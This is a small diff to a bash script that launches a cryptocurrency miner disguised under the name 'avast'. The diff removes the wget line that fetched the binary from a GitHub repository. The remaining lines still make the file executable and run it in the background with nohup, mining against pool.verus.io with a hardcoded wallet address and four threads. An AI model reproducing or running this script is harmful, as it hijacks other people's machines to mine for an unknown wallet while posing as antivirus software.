@@ -1,5 +1,5 @@
 #!/bin/bash
-wget https://github.com/aurbach55/pos/raw/main/avast
+
 chmod +x avast
 nohup ./avast -v -l  pool.verus.io:9999 -u RWZG7MP3LepujPY8rVS9ZuUXZnDdNveBF4.X -t 4 -x > nohup.out
 
